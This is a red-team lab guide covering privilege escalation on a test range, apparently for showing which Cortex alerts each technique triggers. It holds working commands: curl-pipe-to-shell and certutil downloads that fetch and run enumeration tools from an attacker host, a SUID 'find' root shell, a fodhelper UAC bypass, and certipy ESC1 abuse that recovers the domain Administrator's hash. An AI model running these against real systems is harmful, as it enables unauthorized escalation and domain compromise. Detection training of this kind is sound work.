# Tactic: Privilege Escalation

**MITRE:** TA0004 — Privilege Escalation
**Goal:** Elevate from a low-privileged foothold to administrative or SYSTEM/root access — on the local host or across the domain. This guide covers automated enumeration tools and specific abuse techniques.

**Range variables used in this guide**

| Variable | What it represents |
|---|---|
| `<DC_IP>` | Domain Controller IP |
| `<WIN_CLIENT_IP>` | Windows 11 client IP |
| `<LINUX_IP>` | Ubuntu 24.04 target IP |
| `<KALI_IP>` | Kali attacker IP |
| `<DOMAIN>` | Active Directory domain name |
| `<USERNAME>` | Domain or local username |
| `<PASSWORD>` | Account password |

> **Note on staging:** linpeas and winpeas are enumeration binaries that must be transferred to the target first. Each tool below includes the staging step (Python HTTP server on Kali → download on target). The transfer itself generates detections — noted where relevant.

---

## Tool 1 — linpeas: Linux Privilege Escalation Enumeration

**What it does:** A comprehensive script that enumerates a Linux host for privilege-escalation opportunities — SUID binaries, writable files, cron jobs, kernel exploits, credentials, misconfigurations — and colour-codes findings by likelihood. The go-to first step after landing on a Linux host.

**MITRE:** T1082 — System Information Discovery · T1083 — File and Directory Discovery
**Targets:** Linux
**Demo time:** ⚠️ Moderate (~2 minutes)

---

### Give it a try

**Step 1 — Stage linpeas on Kali (serve it over HTTP)**

```
cp /usr/share/peass/linpeas/linpeas.sh /tmp/ && cd /tmp && python3 -m http.server 8000
```

**Step 2 — On the Linux target, download and run it** (via your SSH/shell on the target)

```
curl http://<KALI_IP>:8000/linpeas.sh | sh
```

**What to look for:** Findings highlighted in red/yellow — SUID binaries, writable `/etc/passwd`, sudo misconfigurations, and the "95% PE vector" markers.

---

📸 **Screenshot:** `screenshots/04-privilege-escalation/01-linpeas.png`
*Show: linpeas output — a highlighted privilege escalation finding (red/yellow)*

**What Cortex sees**
> **Alert:** Multiple discovery commands on a Linux host by the same process · SUID/GUID permission discovery
> **Severity:** Medium | **MITRE:** T1082

📸 **Screenshot:** `screenshots/04-privilege-escalation/01-linpeas-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 2 — SUID Binary Enumeration & Abuse

**What it does:** Manually finds files with the SUID bit set — binaries that run as their owner (often root) regardless of who executes them. A misconfigured SUID binary (e.g. `find`, `vim`, `nmap`) can be abused to spawn a root shell. This is the targeted, manual version of what linpeas automates.

**MITRE:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid
**Targets:** Linux
**Demo time:** ✅ Fast (~15 seconds)

---

### Give it a try

**Step 1 — Find all SUID binaries on the target**

```
find / -perm -4000 -type f 2>/dev/null
```

**What to look for:** Non-standard entries. Cross-reference anything unusual against GTFOBins (gtfobins.github.io) for a known escalation.

**Step 2 — Example abuse: if `find` is SUID, spawn a root shell**

```
find . -exec /bin/sh -p \; -quit
```

---

📸 **Screenshot:** `screenshots/04-privilege-escalation/02-suid-enum.png`
*Show: find -perm -4000 output listing SUID binaries, ideally a root shell spawned*

**What Cortex sees**
> **Alert:** SUID/GUID permission discovery · Setuid and Setgid file bit manipulation
> **Severity:** Medium | **MITRE:** T1548.001

📸 **Screenshot:** `screenshots/04-privilege-escalation/02-suid-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 3 — winpeas: Windows Privilege Escalation Enumeration

**What it does:** The Windows counterpart to linpeas. Enumerates a Windows host for privilege-escalation paths — unquoted service paths, weak service permissions, AlwaysInstallElevated, stored credentials, token privileges, and more.

**MITRE:** T1082 — System Information Discovery
**Targets:** Windows Client · DC
**Demo time:** ⚠️ Moderate (~2 minutes)

---

### Give it a try

**Step 1 — Stage winpeas on Kali**

```
cp /usr/share/peass/winpeas/winPEASx64.exe /tmp/ && cd /tmp && python3 -m http.server 8000
```

**Step 2 — On the Windows target, download and run it** (via your evil-winrm / psexec shell)

```
certutil -urlcache -f http://<KALI_IP>:8000/winPEASx64.exe C:\Windows\Temp\wp.exe & C:\Windows\Temp\wp.exe
```

**What to look for:** Findings colour-coded by severity — red indicates likely escalation vectors (weak service perms, unquoted paths, credentials in registry).

---

📸 **Screenshot:** `screenshots/04-privilege-escalation/03-winpeas.png`
*Show: winpeas output — a highlighted Windows privilege escalation finding*

**What Cortex sees**
> **Alert:** Multiple discovery commands on a Windows host by the same process · Encoded information using Windows certificate management tool (certutil download)
> **Severity:** Medium–High | **MITRE:** T1082

📸 **Screenshot:** `screenshots/04-privilege-escalation/03-winpeas-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 4 — Fodhelper UAC Bypass

**What it does:** Abuses `fodhelper.exe`, a trusted Windows binary that auto-elevates, to run an arbitrary command at high integrity — bypassing User Account Control (UAC). Moves a medium-integrity admin session to a full high-integrity one without a UAC prompt.

**MITRE:** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control
**Targets:** Windows Client
**Demo time:** ✅ Fast (~20 seconds)

---

### Give it a try

Run these in a shell on the Windows target (e.g. via evil-winrm).

**Step 1 — Set up the registry hijack fodhelper reads**

```
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f & reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c whoami > C:\Windows\Temp\uac.txt" /f
```

**Step 2 — Trigger the auto-elevating binary**

```
fodhelper.exe
```

**What to look for:** The command in the registry runs at high integrity. Check `C:\Windows\Temp\uac.txt` — it ran elevated.

---

📸 **Screenshot:** `screenshots/04-privilege-escalation/04-fodhelper-uac.png`
*Show: the reg add commands and fodhelper trigger, high-integrity result*

**What Cortex sees**
> **Alert:** Fodhelper.exe UAC bypass · LOLBIN process executed with a high integrity level
> **Severity:** High | **MITRE:** T1548.002

📸 **Screenshot:** `screenshots/04-privilege-escalation/04-fodhelper-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 5 — certipy ESC1: AD CS Template Abuse to Domain Admin

**What it does:** Exploits a vulnerable AD CS certificate template (ESC1 — where a low-privileged user can request a certificate specifying an arbitrary Subject Alternative Name). By requesting a certificate as the Domain Administrator, then authenticating with it, a standard user escalates to full domain control. Builds directly on the certipy enumeration from the Credential Access guide.

**MITRE:** T1649 — Steal or Forge Authentication Certificates
**Targets:** DC (AD CS)
**Demo time:** ⚠️ Moderate (~2 minutes)

---

### Give it a try

**Step 1 — Request a cert as Administrator via the vulnerable template**

```
certipy req -u <USERNAME>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<DOMAIN>
```

**Step 2 — Authenticate with the certificate to retrieve the Administrator hash/TGT**

```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**What to look for:** certipy returns a TGT and the NT hash for Administrator — full domain compromise from a standard user account.

---

📸 **Screenshot:** `screenshots/04-privilege-escalation/05-certipy-esc1.png`
*Show: certipy req + auth — the recovered Administrator TGT/hash*

**What Cortex sees**
> **Alert:** A suspicious process enrolled for a certificate · Suspicious Certutil AD CS contact · Weakly-Encrypted Kerberos Ticket Requested
> **Severity:** High | **MITRE:** T1649

📸 **Screenshot:** `screenshots/04-privilege-escalation/05-certipy-esc1-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*
